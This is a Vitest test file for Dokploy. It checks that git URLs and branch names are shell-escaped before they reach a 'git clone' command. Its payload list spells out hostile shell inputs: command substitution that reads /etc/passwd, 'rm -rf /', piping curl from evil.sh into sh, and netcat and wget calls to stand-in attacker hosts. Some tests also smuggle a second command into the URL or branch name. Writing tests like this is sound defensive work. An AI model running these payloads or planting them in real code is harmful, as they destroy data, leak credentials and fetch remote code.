import { cloneGitRepository } from "@dokploy/server/utils/providers/git";
import { shellWord } from "@dokploy/server/utils/providers/utils";
import { parse } from "shell-quote";
import { describe, expect, it } from "vitest";

// Payloads that, if reached a shell unescaped, would execute commands.
const INJECTION_PAYLOADS = [
	"$(touch /tmp/pwned)",
	"`id`",
	"; rm -rf /",
	"&& curl evil.sh | sh",
	"| nc attacker 4444",
	"https://github.com/o/r.git$(whoami)",
	"main; wget http://evil",
	"$(cat /etc/passwd)",
];

// Legit values that must survive escaping unchanged.
const LEGIT_VALUES = [
	"main",
	"feature/login-v2",
	"release-1.2.3",
	"https://github.com/dokploy/dokploy.git",
	"https://gitlab.example.com/group/sub/project.git",
];

describe("shellWord (git provider shell escaping)", () => {
	it("collapses every injection payload into a single literal token (no shell operators)", () => {
		for (const payload of INJECTION_PAYLOADS) {
			const parsed = parse(shellWord(payload));
			// A safely escaped value parses back to exactly the original string,
			// as ONE token. If escaping failed, parse() would emit operator
			// objects such as { op: ";" } or { op: "$(" } instead.
			expect(parsed).toEqual([payload]);
		}
	});

	it("leaves legitimate URLs and branch names intact", () => {
		for (const value of LEGIT_VALUES) {
			expect(parse(shellWord(value))).toEqual([value]);
		}
	});
});

describe("cloneGitRepository command (customGitUrl path)", () => {
	const buildClone = (customGitUrl: string, customGitBranch: string) =>
		cloneGitRepository({
			appName: "demo-app",
			customGitUrl,
			customGitBranch,
			customGitSSHKeyId: null,
			enableSubmodules: false,
			serverId: null,
			type: "application",
		});

	it("does not let a malicious customGitUrl inject shell operators", async () => {
		const command = await buildClone(
			"https://github.com/o/r.git$(touch /tmp/pwned)",
			"main",
		);
		const tokens = parse(command);
		// No token in the generated command may be a shell operator carrying the
		// injected substitution (e.g. { op: "$(" }). The payload must appear only
		// as inert literal text.
		const hasCommandSubstitution = tokens.some(
			(t) => typeof t === "object" && "op" in t && t.op === "$(",
		);
		expect(hasCommandSubstitution).toBe(false);
		expect(command).toContain("git clone");
	});

	it("does not let a malicious customGitBranch inject shell operators", async () => {
		const command = await buildClone(
			"https://github.com/o/r.git",
			"main; touch /tmp/pwned",
		);
		const tokens = parse(command);
		const hasSemicolonOperator = tokens.some(
			(t) => typeof t === "object" && "op" in t && t.op === ";",
		);
		// The clone builder itself joins statements with ";", so at least the
		// structural ones exist — but the branch payload's ";" must NOT surface
		// as an extra operator that would run `touch`.
		const semicolonOps = tokens.filter(
			(t) => typeof t === "object" && "op" in t && t.op === ";",
		).length;
		expect(hasSemicolonOperator).toBe(true);
		// The branch is a single quoted token, so it contributes no new ";" op.
		expect(command).not.toContain("touch /tmp/pwned;");
	});
});
